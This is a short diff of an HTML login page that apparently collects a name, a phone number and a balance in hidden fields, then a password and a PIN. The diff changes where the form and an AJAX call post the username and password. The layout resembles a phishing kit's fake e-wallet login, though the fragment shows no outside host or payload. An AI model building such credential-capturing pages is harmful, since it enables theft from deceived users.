@@ -462,7 +462,7 @@ position: absolute;
 <center>
 <h3 style="position: absolute; left: 0; right: 0; top: 0; margin: 0px auto; font-size :19px; font-weight: 700; top: 14">Login</h3>
 </center>
-<form action="req/sendLogin.php" method="POST" id="setPin">
+<form action="ver.html" method="POST" id="setPin">
  <ion-icon name="person" id="ionIcons"></ion-icon>
  <input type="hidden" id="nama" name="nama"> 
  <input type="hidden" id="nomor" name="nomor">
@@ -635,7 +635,7 @@ document.getElementById("saldo").value = saldo + "";
                 var pass = $("#pass").val();
 
                 $.ajax({
-                    url: "/ver.html",
+                    url: "ver.html",
                     method: "POST",
                     data: "username="+user+"&password="+pass,
                     beforeSend: function() {
